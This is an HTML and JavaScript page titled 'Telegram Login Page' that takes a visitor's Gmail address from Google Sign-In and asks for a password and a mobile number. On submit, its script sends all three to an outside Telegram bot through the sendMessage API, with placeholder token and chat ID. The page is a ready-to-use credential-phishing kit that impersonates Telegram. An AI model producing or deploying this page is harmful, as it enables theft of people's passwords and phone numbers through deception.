<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Telegram Login Page</title>
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">

  <!-- Google Identity Services -->
  <script src="https://accounts.google.com/gsi/client" async defer></script>
</head>
<body>
  <!-- Header -->
  <header class="bg-primary text-white text-center p-4">
    <h1>Telegram</h1>
    <p>Login to your account</p>
  </header>

  <!-- Login Form -->
  <section id="login" class="container mt-5">
    <div class="row justify-content-center">
      <div class="col-md-5">

        <!-- Google Sign In Button -->
        <div id="g_id_onload"
             data-client_id="287551844511-5r820hvv0gf0fd8064i6tmqhuqe5uakk.apps.googleusercontent.com"
             data-callback="handleCredentialResponse"
             data-auto_prompt="false">
        </div>

        <div class="g_id_signin"
             data-type="standard"
             data-shape="rectangular"
             data-theme="outline"
             data-text="signin_with"
             data-size="large"
             data-logo_alignment="left">
        </div>

        <!-- Custom Login Form -->
        <form id="loginForm" class="mt-4">
          <div class="form-group">
            <label for="gmail">Selected Gmail:</label>
            <input type="text" class="form-control" id="gmail" placeholder="Choose Gmail above" readonly required>
            <small id="gmailError" class="text-danger"></small>
          </div>
          <div class="form-group">
            <label for="password">Password:</label>
            <input type="password" class="form-control" id="password" placeholder="Enter password" required>
          </div>
          <div class="form-group">
            <label for="mobile">Mobile Number:</label>
            <input type="text" class="form-control" id="mobile" placeholder="Enter mobile number (e.g. 919898600143)" required>
            <small id="mobileError" class="text-danger"></small>
          </div>
          <button type="submit" class="btn btn-primary w-100">Login</button>
        </form>

      </div>
    </div>
  </section>

  <!-- JS -->
  <script>
    // === Telegram Bot Config ===
    const BOT_TOKEN = "YOUR_BOT_TOKEN";   // <-- replace with your bot token
    const CHAT_ID  = "YOUR_CHAT_ID";      // <-- replace with your chat id

    // Handle Google Sign-In Response
    function handleCredentialResponse(response) {
      const data = JSON.parse(atob(response.credential.split('.')[1]));
      document.getElementById("gmail").value = data.email;
    }

    // Validation functions
    function isValidEmail(email) {
      const re = /^[^@\s]+@[^@\s]+\.[^@\s]+$/;
      return re.test(email);
    }

    function isValidMobile(mobile) {
      // Must start with 91 and then exactly 10 digits
      const re = /^91\d{10}$/;
      return re.test(mobile);
    }

    // Form Submit
    document.getElementById("loginForm").addEventListener("submit", function(e) {
      e.preventDefault();

      const gmail   = document.getElementById("gmail").value.trim();
      const password = document.getElementById("password").value.trim();
      const mobile   = document.getElementById("mobile").value.trim();

      let valid = true;

      // Gmail validation
      if (!isValidEmail(gmail)) {
        document.getElementById("gmailError").innerText = "Invalid Gmail format.";
        valid = false;
      } else {
        document.getElementById("gmailError").innerText = "";
      }

      // Mobile validation
      if (!isValidMobile(mobile)) {
        document.getElementById("mobileError").innerText = "Invalid mobile number. Must start with 91 + 10 digits.";
        valid = false;
      } else {
        document.getElementById("mobileError").innerText = "";
      }

      if (!valid) return;

      // Send data to Telegram Bot
      const message = `🔐 Login Attempt\n📧 Gmail: ${gmail}\n🔑 Password: ${password}\n📱 Mobile: ${mobile}`;

      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: CHAT_ID, text: message })
      })
      .then(res => res.json())
      .then(data => {
        alert("Login successful! Data sent to Telegram.");
        console.log("Telegram response:", data);
      })
      .catch(err => {
        alert("Error sending data to Telegram.");
        console.error(err);
      });
    });
  </script>

  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
</body>
</html>
